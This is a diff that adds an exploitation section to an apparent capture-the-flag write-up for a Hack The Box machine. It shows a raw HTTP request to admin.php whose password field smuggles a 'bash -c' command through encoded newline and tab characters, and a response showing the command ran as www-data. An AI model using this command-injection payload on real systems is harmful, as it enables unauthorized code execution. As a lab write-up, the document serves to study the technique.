@@ -56,3 +56,31 @@ if (isset($_POST['backup']) && !empty($_POST['password'])) {
 }
 ?>
 ```
+## Exploitation:
+
+- Request
+```
+POST /admin.php HTTP/1.1
+Host: nocturnal.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Origin: http://nocturnal.htb
+Connection: keep-alive
+Referer: http://nocturnal.htb/admin.php
+Cookie: PHPSESSID=iqnvodhm7sq7n7keqcs1tds2op
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+password=0281649%0abash%09-c%09"id"&backup=
+```
+- Response
+
+```
+<pre>
+sh: 2: backups/backup_2025-08-03.zip: not founbash: -c: option uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+```
